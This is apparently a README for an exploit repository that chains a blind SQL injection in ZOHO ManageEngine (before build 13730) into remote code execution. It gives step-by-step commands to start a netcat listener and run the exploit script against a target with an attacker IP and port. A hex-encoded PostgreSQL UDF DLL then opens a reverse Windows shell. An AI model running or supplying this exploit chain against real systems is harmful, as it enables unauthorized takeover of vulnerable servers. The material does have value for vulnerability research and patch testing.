# ZOHO ManageEngine SQLi to RCE Exploit Chain

ManageEngine-SQLi-RCE.py : Python script to exploit ManageEngine SQLi into RCE; prior to versions Build 13730

psql-udf.hex : hex encoded DLL of a custom UDF function which creates a reverse Windows shell.

src/psql-udf/psql-udf.c: source code for psql-udf.hex

## Summary 
ZOHO ManageEngine before build 13730 has a blind SQLi in the AMUserResourcesSyncServlet. If the database user has
administrator privileges then the SQLi can be leveraged into full RCE by using write-to-disk exploits.
Also if the backend database is PostgreSQL then there is the possibility to install a User Defined Function and
then call that function to establish a reverse shell, as this exploit is written to do.

## Proof-Of-Concept
1. Download or clone git repo
2. Start a netcat listener
   `$ nc -lvp 4444`
3. Run ManageEngine-SQLi-RCE.py with the full path to psql-udf.hex
   `$ python3 ./ManageEngine-SQLi-RCE.py -t https://target.com:8443 -f "/home/user/ManageEngine SQLi-RCE/psql-udf.hex" -l attacker.ip -p 4444`

## Other
* If you need to change the DLL file which the function is loaded from the source code for psql-udf.hex is included in the udf folder.
* You will need to recompile it using VScode
* then you will need to hex encode the DLL
